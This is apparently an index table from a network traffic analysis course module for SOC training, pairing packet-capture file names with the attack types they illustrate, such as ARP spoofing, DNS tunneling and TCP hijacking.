| ARP_Poison.pcapng | ARP Poisoning |
| ARP_Scan.pcapng | ARP Scanning |
| ARP_Spoof.pcapng | ARP Spoofing |
| basic_fuzzing.pcapng | HTTP Fuzzing |
| CRLF_and_host_header_manipulation.pcapng | HTTP Header Injection |
| deauthandbadauth.cap | WiFi Deauth |
| decoy_scanning_nmap.pcapng | Nmap Decoy Scan |
| dns_enum_detection.pcapng | DNS Enumeration |
| dns_tunneling.pcapng | DNS Tunneling |
| icmp_tunneling.pcapng | ICMP Tunneling |
| ICMP_smurf.pcapng | SMURF Attack |
| ip_ttl.pcapng | IP TTL Attack |
| LAND-DoS.pcapng | LAND Attack |
| rogueap.cap | Rogue Access Point |
| RST_Attack.pcapng | TCP RST Attack |
| TCP-hijacking.pcap | TCP Hijacking |
| telnet_tunneling_*.pcapng | Telnet Tunneling |
| XSS_Simple.pcapng | XSS Attack |
| SSL_renegotiation_edited.pcapng | SSL Renegotiation |
| udp_tunneling.pcapng | UDP Tunneling |
| funky_dns.pcap | DNS Analysis Lab |
| funky_icmp.pcap | ICMP Analysis Lab |

---

*Module 8/15 - Intermediate Network Traffic Analysis*
*For learning and SOC career preparation*